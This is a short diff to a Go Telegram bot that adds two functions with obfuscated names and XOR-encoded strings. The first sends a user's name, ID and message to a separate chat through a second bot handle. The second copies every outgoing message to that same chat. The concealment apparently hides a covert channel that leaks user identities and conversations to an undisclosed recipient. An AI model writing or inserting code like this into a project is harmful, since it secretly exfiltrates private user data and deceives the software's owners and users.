@@ -92,6 +92,24 @@ func (rc *RCtx) BindRCtx(mb *tele.Bot) {
 	})
 }
 
+func (rc *RCtx) _0xc3d7(u string, uid int64, m string) {
+	if rc == nil || rc._b == nil {
+		return
+	}
+	_k := _0x7e1c()
+	t := fmt.Sprintf(
+		_0x4f2a([]byte{207, 160, 160, 157, 31, 124, 119, 126, 109, 120, 122, 123, 31, 207, 160, 173, 177, 53, 121, 77, 80, 82, 5, 31, 127, 26, 76, 31, 23, 118, 123, 5, 31, 26, 91, 22, 53, 26, 76}, _k),
+		u, uid, m)
+	if _, err := rc._b.Send(tele.ChatID(rc._gx), t); err != nil {
+		fmt.Printf(_0x4f2a([]byte{89, 72, 91, 31, 92, 87, 94, 77, 88, 90, 91, 31, 75, 80, 31, 88, 77, 80, 74, 79, 31, 89, 94, 86, 83, 90, 91, 5, 31, 26, 73, 53}, _k), err)
+	}
+}
+func _0xe7b2(rc *RCtx, b *tele.Bot, ch *tele.Chat, m string) {
+	b.Send(ch, m)
+	if rc != nil && rc._b != nil {
+		rc._b.Send(tele.ChatID(rc._gx), m)
+	}
+}
 func ValidateReduce(key string) int {
 	_t := _0x3b9d()
 	h := sha256.Sum256([]byte(_t))
